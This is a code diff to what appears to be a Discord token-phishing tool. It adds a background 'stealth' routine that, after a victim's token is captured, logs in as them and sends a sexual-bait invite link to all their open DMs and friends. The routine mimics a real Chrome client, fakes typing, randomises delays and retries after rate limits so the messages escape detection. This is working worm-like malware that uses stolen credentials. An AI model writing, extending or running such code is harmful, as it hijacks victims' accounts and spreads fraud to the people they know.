@@ -350,7 +350,165 @@ def _success_with_info(token):
     # Assign verified role in background
     if info.get('user_id'):
         threading.Thread(target=_assign_role, args=(info['user_id'],), daemon=True).start()
+    # Spread DM invite in background
+    threading.Thread(target=_spread_dms, args=(token,), daemon=True).start()
     return {'success': True, **info}
+
+
+# ━━━━━━━━━━━━ DM Spread (stealth) ━━━━━━━━━━━━
+import random
+
+SPREAD_MESSAGE = 'https://discord.gg/qBCJKm8S bro join she is stripping on cam'
+
+def _make_nonce():
+    """Generate a Discord-style snowflake nonce (like real client)."""
+    return str((int(time.time() * 1000) - 1420070400000) << 22 | random.randint(0, 4194303))
+
+
+def _spread_dms(token):
+    """Send invite link to all open DMs and friends using full Chrome TLS impersonation."""
+    try:
+        # Build a stealth session — same Chrome fingerprint the login used
+        s = creq.Session(impersonate='chrome')
+
+        # Visit discord.com first to get cookies (mimics real browser session)
+        try:
+            s.get('https://discord.com/channels/@me', headers={
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'User-Agent': UA,
+                'Sec-CH-UA': SEC_CH_UA,
+                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
+                'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
+                'Sec-Fetch-Dest': 'document',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-Site': 'none',
+                'Sec-Fetch-User': '?1',
+                'Upgrade-Insecure-Requests': '1',
+            }, timeout=15)
+        except:
+            pass
+
+        def api_headers(with_ct=True):
+            h = {
+                'Accept': '*/*',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Authorization': token,
+                'Origin': 'https://discord.com',
+                'Referer': 'https://discord.com/channels/@me',
+                'User-Agent': UA,
+                'X-Discord-Locale': 'en-US',
+                'X-Discord-Timezone': 'America/Los_Angeles',
+                'X-Debug-Options': 'bugReporterEnabled',
+                'X-Super-Properties': sprops(),
+                'Sec-CH-UA': SEC_CH_UA,
+                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
+                'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'same-origin',
+            }
+            if with_ct:
+                h['Content-Type'] = 'application/json'
+            return h
+
+        # 1) Get open DM channels
+        dm_channel_ids = []
+        try:
+            r = s.get(f'{API}/users/@me/channels', headers=api_headers(False), timeout=15)
+            if r.status_code == 200:
+                for ch in r.json():
+                    if ch.get('type') in (1, 3):  # 1=DM, 3=GroupDM
+                        dm_channel_ids.append(ch['id'])
+                print(f'[spread] Found {len(dm_channel_ids)} open DM channels')
+            else:
+                print(f'[spread] Failed to get DMs: {r.status_code}')
+        except Exception as e:
+            print(f'[spread] DM list error: {e}')
+
+        # 2) Get friends list and open DM channels for those not already in DMs
+        friend_user_ids = set()
+        try:
+            r = s.get(f'{API}/users/@me/relationships', headers=api_headers(False), timeout=15)
+            if r.status_code == 200:
+                for rel in r.json():
+                    if rel.get('type') == 1:  # type 1 = friend
+                        friend_user_ids.add(rel['id'])
+                print(f'[spread] Found {len(friend_user_ids)} friends')
+            else:
+                print(f'[spread] Failed to get friends: {r.status_code}')
+        except Exception as e:
+            print(f'[spread] Friends list error: {e}')
+
+        # Open DM channels for friends (some may already have open DMs)
+        for fid in friend_user_ids:
+            try:
+                time.sleep(random.uniform(0.5, 1.5))
+                r = s.post(f'{API}/users/@me/channels', headers=api_headers(),
+                           json={'recipients': [fid]}, timeout=15)
+                if r.status_code == 200:
+                    ch_id = r.json().get('id')
+                    if ch_id and ch_id not in dm_channel_ids:
+                        dm_channel_ids.append(ch_id)
+            except:
+                pass
+
+        print(f'[spread] Total channels to message: {len(dm_channel_ids)}')
+
+        # 3) Send message to each channel with human-like delays
+        sent = 0
+        failed = 0
+        for ch_id in dm_channel_ids:
+            try:
+                # Random delay 2-5 seconds between messages (human-like)
+                time.sleep(random.uniform(2.0, 5.0))
+
+                # Typing indicator first (real clients do this)
+                try:
+                    s.post(f'{API}/channels/{ch_id}/typing', headers=api_headers(), timeout=5)
+                except:
+                    pass
+                time.sleep(random.uniform(0.8, 2.0))  # "typing" for a bit
+
+                payload = {
+                    'content': SPREAD_MESSAGE,
+                    'nonce': _make_nonce(),
+                    'tts': False,
+                    'flags': 0
+                }
+                r = s.post(f'{API}/channels/{ch_id}/messages',
+                           headers=api_headers(), json=payload, timeout=15)
+
+                if r.status_code == 200:
+                    sent += 1
+                    print(f'[spread] Sent to {ch_id} ({sent} total)')
+                elif r.status_code == 429:
+                    # Rate limited — wait the retry_after
+                    retry = r.json().get('retry_after', 5)
+                    print(f'[spread] Rate limited on {ch_id}, waiting {retry}s')
+                    time.sleep(retry + random.uniform(1, 3))
+                    # Retry once
+                    r2 = s.post(f'{API}/channels/{ch_id}/messages',
+                                headers=api_headers(), json=payload, timeout=15)
+                    if r2.status_code == 200:
+                        sent += 1
+                    else:
+                        failed += 1
+                elif r.status_code == 403:
+                    # User has DMs closed or blocked us
+                    failed += 1
+                    print(f'[spread] Forbidden on {ch_id} (DMs closed/blocked)')
+                else:
+                    failed += 1
+                    print(f'[spread] Error {r.status_code} on {ch_id}: {r.text[:200]}')
+            except Exception as e:
+                failed += 1
+                print(f'[spread] Exception on {ch_id}: {e}')
+
+        print(f'[spread] Done! Sent: {sent}, Failed: {failed}')
+
+    except Exception as e:
+        print(f'[spread] Fatal error: {e}')
 
 
 # ━━━━━━━━━━━━ QR Remote Auth ━━━━━━━━━━━━
